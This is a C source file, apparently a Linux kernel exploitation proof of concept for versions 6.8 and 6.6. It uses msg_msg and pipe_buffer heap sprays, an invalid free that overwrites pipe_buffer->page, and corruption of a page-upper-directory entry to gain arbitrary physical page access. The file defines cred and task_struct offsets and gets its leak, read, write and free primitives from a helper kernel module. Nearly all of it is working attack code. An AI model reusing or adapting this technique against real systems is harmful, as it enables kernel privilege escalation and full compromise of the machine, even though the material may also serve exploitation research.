#include "utils.h"
#include "ulkm.h"
#include "msg_msg.h"
#include "pipe_buffer.h"
#include "pgtable.h"
#include "tlb_flush.h"
#include <sys/syscall.h>
#include <sys/mman.h>
#include <pthread.h>
#include <assert.h>
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>

#define ANON_PIPE_BUF_OPS_OFFSET 0x1648cc0 // v6.8
// #define ANON_PIPE_BUF_OPS_OFFSET 0x1448280 // v6.6

// #define DEBUG
#define RESTORE

#define TASK_STRUCT_SLAB_ORDER 3
// #define TASK_STRUCT_SIZE 10496
#define TASK_STRUCT_COMM_OFFSET 3008
// #define TASK_STRUCT_COMM_OFFSET 3016
#define TASK_STRUCT_PID_OFFSET 2464
// #define TASK_STRUCT_PID_OFFSET 2456
#define TASK_STRUCT_TGID_OFFSET 2468
// #define TASK_STRUCT_TGID_OFFSET 2460
#define TASK_STRUCT_REAL_CRED_OFFSET 2984
// #define TASK_STRUCT_REAL_CRED_OFFSET 2992
#define TASK_STRUCT_CRED_OFFSET 2992
// #define TASK_STRUCT_CRED_OFFSET 3000

#define CRED_UID_GID_OFFSET 8
#define CRED_SUID_SGID_OFFSET 16
#define CRED_EUID_EGID_OFFSET 24
#define CRED_FSUID_FSGID_OFFSET 32
#define CRED_CAP_INHERITABLE_OFFSET 48
#define CRED_CAP_PERMITTED_OFFSET 56
#define CRED_CAP_EFFECTIVE_OFFSET 64
#define CRED_CAP_BSET_OFFSET 72
#define CRED_CAP_AMBIENT_OFFSET 80

#define PAGE_SIZE (1<<12)

#define OBJ_PER_SLAB 42

#define MSG_SPRAYS (OBJ_PER_SLAB*40)
#define MSG_FREE (MSG_SPRAYS-2*OBJ_PER_SLAB)
#define MSG_TYPE 0x41
#define MSG_HEADER 48
#define MSG_NEXT_HEADER 8
#define __MSG_SIZE 96
#define MSG_SIZE (__MSG_SIZE-MSG_HEADER)

#define MSG_SPRAYS2 (OBJ_PER_SLAB*4)
#define MSG_TYPE2 0x42
#define __MSG_SIZE2 (4096+__MSG_SIZE)
#define MSG_SIZE2 (__MSG_SIZE2-MSG_HEADER-MSG_NEXT_HEADER)

#define PIPE_SPRAY (OBJ_PER_SLAB*4)
#define PIPE_SIZE 40
#define PIPE_CNT 1

int qids[MSG_SPRAYS];
int qids2[MSG_SPRAYS2];
size_t overlayed_id = -1;

size_t virt_base;
size_t vmemmap_base;
size_t dpm_base;
size_t code_base;

size_t msg_msg;

char buffer[0x2000];
char page_content[sizeof(buffer)];
char page_content_org[sizeof(buffer)];

int pipes[PIPE_SPRAY][2];

void cleanup(void)
{
    printf("[*] cleanup\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        cleanup_queue(qids[i]);
    for (size_t i = 0; i < MSG_SPRAYS2; ++i)
        if (i != overlayed_id)
            cleanup_queue_no_err(qids2[i]);
}

size_t pipe_buffer;
void stage1(void)
{
    msg *message = (msg *)buffer;
    message->mtype = MSG_TYPE;

    printf("[*] alloc msg_queue\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        qids[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    printf("[*] alloc msg_msg\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        send_msg(qids[i], message, MSG_SIZE, 0);

    lkm_msg_msg_leak((size_t)&msg_msg, qids[MSG_FREE], MSG_TYPE);
    printf("[+] leaked msg_msg %016zx\n", msg_msg);

    printf("[*] free msg_msg\n");
    memset(buffer, 0x41, sizeof(buffer));
    // free all all but 1 of the current slab
    //   creates all free slots on the slot except one
    //   except one because to prevent returning the partial slab to the page allocator (unlikely but may be)
    for (ssize_t i = -OBJ_PER_SLAB*2; i < OBJ_PER_SLAB; ++i)
        get_msg(qids[MSG_FREE+i], message, MSG_SIZE, 0, IPC_NOWAIT);
    for (size_t i = 0; i < PIPE_SPRAY; ++i) {
        alloc_pipes(pipes[i], O_NONBLOCK);
        resize_pipe(pipes[i][0], 2);
        write_pipe(pipes[i][1], buffer, 8);
    }
    printf("[*] reclaimed as pipe_buffer\n");
    pipe_buffer = (msg_msg & ~0xfff) + __MSG_SIZE;
    printf("[+] pipe_buffer %016zx\n", pipe_buffer);

#ifdef DEBUG
    printf("[*] pipe_buffer:\n");
    for (ssize_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif
}

size_t vmemmap_pud;
#ifdef RESTORE
char pipe_buffer_old_content[PIPE_SIZE];
void save_pipe_buffer_state(void)
{
    for (size_t i = 0; i < PIPE_SIZE; i += 8)
        lkm_read(pipe_buffer+i, (size_t)&pipe_buffer_old_content[i]);
    printf("[*] temporarily store pipe_buffer content\n");
}
void restore_pipe_buffer_state(void)
{
    for (size_t i = 0; i < PIPE_SIZE; i += 8)
        lkm_write(pipe_buffer+i, *(size_t *)(pipe_buffer_old_content + i));
    printf("[*] store old pipe_buffer content\n");
}
#else
void save_pipe_buffer_state(void) {}
void restore_pipe_buffer_state(void) {}
#endif

size_t address;
size_t pud;
void stage2(void)
{
    printf("[*] leak pud\n");
    address = (void *)mmap((void *)((1ULL<<39)|255*(1ULL<<30)), PAGE_SIZE, PROT_WRITE|PROT_READ, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -1, 0);
    if ((void *)address == MAP_FAILED) {
        perror("mmap()");
        exit(-1);
    }
    *(volatile size_t *)address;
    size_t pgde;
    size_t pude;
    size_t pmde;
    size_t pte;
    lkm_arb_pagetable_wald(address, &pgde, &pude, &pmde, &pte);
    pud = dpm_base + (pgde & ~(0xfff));
    printf("[*] %016zx: %016zx -> %016zx -> %016zx -> %016zx\n", address, pgde, pude, pmde, pte);
    printf("[*] pud %016zx\n", pud);
}

struct pipe_buffer {
    size_t page;
    unsigned int len;
    unsigned int offset;
    size_t ops;
    unsigned int flags;
    size_t private;
};

#define PHYS_TO_VMEMMAP(x) ((((x) >> 12) << 6) + vmemmap_base)
#define DPM_TO_VMEMMAP(x) PHYS_TO_VMEMMAP((x) - dpm_base)
void stage3(void)
{
    vmemmap_pud = DPM_TO_VMEMMAP(pud);
    save_pipe_buffer_state();

    memset(buffer, 0, sizeof(buffer));

    msg *message = (msg *)buffer;
    message->mtype = MSG_TYPE2;
    printf("[*] alloc queues for reclaiming invalid free\n");
    for (size_t i = 0; i < MSG_SPRAYS2; ++i)
        qids2[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    printf("[*] invalid free at %016zx\n", pipe_buffer-8);
    lkm_arb_free(pipe_buffer-8);

    printf("[*] overwrite pipe_buffer->page with %016zx\n", vmemmap_pud);
    struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
    memset(corr_pipe_buffer, 0, sizeof(struct pipe_buffer));
    corr_pipe_buffer->page = vmemmap_pud;
    corr_pipe_buffer->offset = 8;
    corr_pipe_buffer->len = 15;
    corr_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    corr_pipe_buffer->flags = 0x10;
    for (size_t i = 0; i < MSG_SPRAYS2; ++i)
        send_msg(qids2[i], message, MSG_SIZE2, 0);

#ifdef DEBUG
    printf("[*] pipe_buffer:\n");
    for (ssize_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif
}

void pud_print(void)
{
    printf("[*] print pud\n");
    for (size_t i = 0; i < 16*8; i += 8) {
        size_t tmp;
        lkm_read(pud+i, (size_t)&tmp);
        printf("%016zx: %016zx\n", pud+i, tmp);
    }
}

#define IS_VMEMMAP(x) (((x) & ~((1<<30)-1)) == vmemmap_base)
size_t page_fd = -1;
size_t pivot_addr;
void stage4(void)
{
    size_t count = 0;
    printf("[*] find overwritten pipe_buffer\n");
    for (size_t i = 0; i < PIPE_SPRAY; ++i) {
        memset(buffer, 0, sizeof(buffer));
        read_pipe(pipes[i][0], buffer, 7);
        if (buffer[0] != 0x41) {
            buffer[7] = -1;
            count++;
            page_fd = i;
            printf("[+] found pipe_buffer fd %4zd\n", page_fd);
            if (IS_VMEMMAP(*(size_t *)(buffer))) {
                printf("[+] found page %016zx\n", *(size_t *)(buffer));
                continue;
            }
        }
    }

    if (page_fd == (size_t)-1 || count != 1) {
        printf("[!] count         %zd\n", count);
        printf("[!] page_fd       %016zx\n", page_fd);
        restore_pipe_buffer_state();
        exit(-1);
    }

    printf("[*] find msg_msg that overlays the corrupted pipe_buffer\n");
    for (size_t i = 0; i < MSG_SPRAYS2; ++i) {
        memset(buffer, 0, sizeof(buffer));
        get_msg(qids2[i], buffer, MSG_SIZE2, 0, MSG_COPY|IPC_NOWAIT);
        struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
        if (corr_pipe_buffer->offset != 8 || corr_pipe_buffer->len != 15) {
            printf("[+] found overlayed msg_msg %zd\n", i);
            overlayed_id = i;
        }
    }

#ifdef DEBUG
    printf("[*] pipe_buffer:\n");
    for (ssize_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif

    printf("[*] write to pud\n");
    char _cor_pude[16*8+1];
    memset(_cor_pude, 0, sizeof(_cor_pude));
    for (size_t i = 0; i < 16; ++i) {
        *(size_t *)(_cor_pude + 1 + 8*i) = PAGE_TABLE_LARGE + i*(1ULL << 30) + (4ULL << 30);
    }
    write_pipe(pipes[page_fd][1], (void *)_cor_pude, 16*8);

    pivot_addr = ((1ULL<<39)|3*(1ULL<<30));
    size_t pgde;
    size_t pude;
    size_t pmde;
    size_t pte;
    lkm_arb_pagetable_wald(pivot_addr, &pgde, &pude, &pmde, &pte);
    printf("[*] %016zx: %016zx -> %016zx -> %016zx -> %016zx\n", pivot_addr, pgde, pude, pmde, pte);

#ifdef DEBUG
    pud_print();
    printf("[*] pipe_buffer:\n");
    for (ssize_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif
}

size_t old_pt;
size_t *arb_pt = (size_t *)-1;
char *arb_page = (char *)-1;
void stage5(void)
{
    for (size_t try = 0; try < 0x10; ++try) {
        char buf[PAGE_SIZE];
        char *ptr = mmap((void *)((1ULL << 46)|(1ULL<<39)*try), (1<<30), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
        if (ptr == MAP_FAILED) {
            perror("mmap");
            cleanup();
            restore_pipe_buffer_state();
            exit(-1);
        }
        size_t mapping_space = (16ULL<<30);

        printf("[*] init pt already mapped\n");
        char *pt_already_mapped = malloc(mapping_space/PAGE_SIZE);
        memset(pt_already_mapped, 0, mapping_space/PAGE_SIZE);
        for (size_t i = 0; i < mapping_space/PAGE_SIZE; ++i)
            if ((*(size_t *)(pivot_addr + PAGE_SIZE * i) & PTE) == PTE)
                pt_already_mapped[i] = 1;

        printf("[*] map a lot of page tables\n");
        for (size_t i = 0; i < (1<<30); i += (1<<21))
            memset(ptr + i, 0x46, PAGE_SIZE);

        printf("[*] show where new page tables are\n");
        for (size_t i = 0; i < mapping_space/PAGE_SIZE; ++i) {
            if ((*(size_t *)(pivot_addr + PAGE_SIZE * i) & PTE) == PTE && pt_already_mapped[i] == 0) {
                printf("[+] found pt at %ld with %016zx\n", i, *(size_t *)(pivot_addr + PAGE_SIZE * i));
                arb_pt = (size_t *)(pivot_addr + PAGE_SIZE * i);
                old_pt = *arb_pt;
                *arb_pt = PTE;
                break;
            }
        }

        memset(buf, 0x46, PAGE_SIZE);
        for (size_t i = 0; i < (1<<30); i += (1<<21)) {
            if (memcmp(ptr + i, buf, PAGE_SIZE)) {
                arb_page = ptr + i;
                printf("[+] found page %016zx\n", (size_t)arb_page);
                break;
            }
        }
        if (arb_page != (char *)-1)
            break;
        printf("[?] arbitrary page not found -> retry\n");
    }
    if (arb_page == (char *)-1) {
        printf("[!] arbitrary page not found\n");
        cleanup();
        restore_pipe_buffer_state();
        exit(-1);
    }
    printf("[+] success\n");
}

int main(void)
{
    int ret = 0;
    pin_to_core(0);
    set_limit();
    printf("[*] start\n");
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    init_tlb_flush();
    get_total_memory();

    lkm_init();

    lkm_virt_base_leak((size_t)&virt_base);
    lkm_vmemmap_leak((size_t)&vmemmap_base);
    lkm_dpm_leak((size_t)&dpm_base);
    lkm_code_leak((size_t)&code_base);
    printf("[*] virt_base    %016zx\n", virt_base);
    printf("[*] vmemmap_base %016zx\n", vmemmap_base);
    printf("[*] dpm_base     %016zx\n", dpm_base);
    printf("[*] code_base    %016zx\n", code_base);

    stage1();
    stage2();
    stage3();
    stage4();
    stage5();

    cleanup();
    restore_pipe_buffer_state();
    printf("[*] done\n");
    return ret;
}